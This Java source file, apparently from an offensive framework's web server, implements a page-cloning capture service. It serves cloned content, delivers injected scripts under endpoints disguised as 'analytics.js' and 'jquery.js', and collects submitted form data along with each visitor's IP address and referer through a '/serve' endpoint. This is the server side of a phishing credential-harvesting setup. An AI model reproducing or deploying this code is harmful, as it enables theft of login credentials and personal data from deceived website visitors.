package cloudstrike;

import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import profiler.SystemProfiler;

public class CaptureContent implements WebService {
    protected String content;
    protected String type;

    public void addCaptureListener(CaptureListener l) {
        this.listeners.add(l);
    }

    protected String desc;

    public CaptureContent(String content, String type, String desc) {
        this.proto = "";
        this.listeners = new LinkedList();
        this.content = content;
        this.type = type;
        this.desc = desc;
    }

    protected String proto;
    protected List listeners;

    public void setup(WebServer w, String uri) {
        w.register(uri, this);
        w.registerSecondary("/analytics.js", this);
        w.registerSecondary("/serve", this);
        w.registerSecondary("/jquery.js", this);

        if (w.isSSL()) {
            this.proto = "https://";
        } else {
            this.proto = "http://";
        }
    }

    public String resource(String resource, String url) {
        StringBuffer temp = new StringBuffer(524288);
        try {
            SystemProfiler.suckItDown(resource, temp);
        } catch (Exception ex) {
            WebServer.logException("Could not get " + resource, ex, false);
        }
        return temp.toString().replace("%URL%", url);
    }

    public Response serve(String uri, String method, Properties header, Properties param) {
        if (uri.equals("/analytics.js")) {
            return new Response("200 OK", "text/javascript", resource("/resources/analytics.js", this.proto + header.get("Host")));
        }
        if (uri.equals("/jquery.js")) {
            return new Response("200 OK", "text/javascript", resource("/resources/jquery-1.7.1.min.js", this.proto + header.get("Host")));
        }
        if (uri.equals("/serve")) {
            Iterator i = this.listeners.iterator();
            String who = header.get("REMOTE_ADDRESS") + "";
            String from = header.get("Referer") + "";

            if (who.length() > 1) {
                who = who.substring(1);
            }
            CaptureListener l = null;
            while (i.hasNext()) {
                try {
                    l = (CaptureListener) i.next();
                    l.capturedForm(from, who, param, param.get("id") + "");
                } catch (Exception ex) {
                    WebServer.logException("Listener: " + l + " vs. " + from + ", " + who + ", " + param, ex, false);
                }
            }
            return new Response("200 OK", "text/plain", "");
        }
        return new Response("200 OK", this.type, this.content);
    }


    public String toString() {
        return this.desc;
    }


    public String getType() {
        return "page";
    }


    public List cleanupJobs() {
        return new LinkedList();
    }


    public boolean suppressEvent(String uri) {
        return false;
    }


    public boolean isFuzzy() {
        return false;
    }

    public static interface CaptureListener {
        void capturedForm(String string1, String string2, Map map, String string3);
    }
}
